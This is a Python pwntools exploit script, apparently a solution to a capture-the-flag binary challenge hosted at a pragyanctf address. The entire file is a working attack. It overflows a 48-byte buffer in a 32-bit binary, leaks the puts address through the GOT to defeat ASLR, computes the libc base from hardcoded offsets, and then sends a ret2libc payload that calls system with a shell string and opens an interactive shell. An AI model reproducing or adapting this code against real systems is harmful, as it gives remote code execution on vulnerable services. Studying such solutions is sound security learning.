#!/usr/bin/env python3
from pwn import *

context.update(arch = 'i386')
exe = './vuln'

elf = ELF(exe)
rop = ROP(elf)

libc = ELF('libvuln.so')

host = args.HOST or 'binary.challs.pragyanctf.tech'
port = int(args.PORT or 6001)

def local(argv = [], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript = gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv = [], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript = gdbscript)
    return io

def start(argv = [], *a, **kw):
    '''Start the exploit against the target'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

puts_plt = elf.plt['puts']
main_sym = elf.sym['main']
puts_got = elf.got['puts']

ret = rop.find_gadget(['ret'])[0]

puts_offset = 0x000000071cd0
system_offset = 0x000000045830
shell_offset = 0x000000192352

io = start()

io.recv()

payload  = b'A' * 48 + b'B' * 4
payload += p32(puts_plt)
payload += p32(main_sym)
payload += p32(puts_got)

io.sendline(payload)
io.recvuntil(b'Thank you!\n')

puts_leak = u32(io.recvuntil(b'\xf7'))
libc.base = puts_leak - puts_offset

system = libc.base + system_offset
shell = libc.base + shell_offset

payload  = b'A' * 48 + b'B' * 4
payload += p32(ret)
payload += p32(system)
payload += p32(0x0)
payload += p32(shell)

io.sendline(payload)

io.interactive()